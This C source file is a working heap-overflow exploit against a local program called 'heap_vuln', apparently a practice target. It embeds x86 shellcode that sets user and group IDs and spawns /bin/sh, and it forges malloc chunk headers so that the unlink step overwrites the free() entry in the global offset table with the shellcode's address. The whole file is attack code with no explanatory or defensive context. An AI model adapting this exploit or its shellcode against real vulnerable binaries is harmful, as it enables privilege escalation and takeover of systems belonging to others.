#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define FREE_GOT_ADDRESS 0x080496ec
#define RET (0x080497b8 + 8)
#define GARBAGE 0x12345678

char shellcode[]=
  "\xeb\x0aXXXXXXXXXX"
  "\x33\xc0\x31\xdb\xb0\x17\xcd\x80"
  "\x33\xc0\x31\xdb\xb0\x2e\xcd\x80"
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0"
  "\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
  "\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff"
  "/bin/sh";

int main()
{
  char buf[300];
  char *p;

  p = buf;
  *((void **)p) = (void *)(GARBAGE);
  p += 4;
  *((void **)p) = (void *)(GARBAGE);
  p += 4;
  memcpy(p, shellcode, strlen(shellcode));
  p += strlen(shellcode);
  memset(p, 'A', 200 - 2 * 4 - strlen(shellcode));
  p += (200 - 2 * 4 - strlen(shellcode));
  *((size_t *)p) = (size_t)(GARBAGE & ~0x1);
  p += 4;
  *((size_t *)p) = (size_t)(-4);
  p += 4;
  *((void **)p) = (void *)(FREE_GOT_ADDRESS - 12);
  p += 4;
  *((void **)p) = (void *)(RET);
  p += 4;
  *p = '\0';

  execl("./heap_vuln", "heap_vuln", buf, 0);

  return 0;
}
